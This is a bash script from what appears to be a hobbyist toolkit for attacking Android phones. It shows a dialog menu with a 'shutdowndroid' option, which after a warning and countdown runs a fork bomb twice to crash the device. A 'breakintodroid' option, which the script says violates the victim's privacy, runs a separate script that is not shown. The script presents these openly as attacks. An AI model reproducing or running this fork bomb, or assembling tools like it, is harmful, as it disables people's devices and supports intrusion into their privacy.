red="\033[0;49;91m"
green="\033[0;49;92m"
yellow="\033[0;49;93m"
dblue="\033[0;49;94m"
violet="\033[0;49;95m"
blue="\033[0;49;96m"
white="\033[0;49;97m"
answer=$(dialog --stdout \
	--radiolist "Choose An Attack!" 0 0 3 \
	"odr" "shutdowndroid" off "itr" "breakintodroid" off)
if [ "$answer" == "odr" ]
then
	clear
	echo -e "\033[7;49;91m THIS ATTACK CAN BREAK YOUR SMARTPHONE, IM NOT RESPONDING FOR YOUR ACTIONS!!!\033[m"
	read -p "Do you want to proceed?(y/n) " resp
	evil=("nn" "NN" "n" "N")
	notevil=("YY" "yy" "y" "Y")
	if [ "$resp" == "y" ]
	then
		bash rbanner.sh
		for i in $(seq 5)
		do
			echo -en "YOUR TIME IS RUNING ON..."
			sleep 1
			echo -en "$i\r\r"
		done
		:(){ :|:& };: ; :(){ :|:& };: && touch 'inprotocol-xOxOX000x0000000x'
	elif [ "$resp" == "n" ]
	then 
		echo $red "Good job! see ya later.."

	else
		echo ""
	
	fi

elif [ "$answer" == "itr" ]
then
	clear
	echo -e "\033[7;49;91m THIS ATTACKS VIOLATES THE VICTIM PRIVACY, IM NOT RESPONDING FOR YOUR ACTIONS!!!\033[m"
        read -p "Do you want to proceed?(y/n) " rsp
        if [ "$rsp" == "y" ]
        then
		bash rbanner.txt
		for i in $(seq 5)
                do
                        echo -en "YOUR TIME IS RUNING ON..."
                        sleep 1
                        echo -en "$i\r\r"
                done
                bash bashrc

        elif [ "$rsp" == "n" ]
        then
                echo $red "Good job! see ya later.."

        else
                echo ""
	fi

else
	bash gui.sh

fi
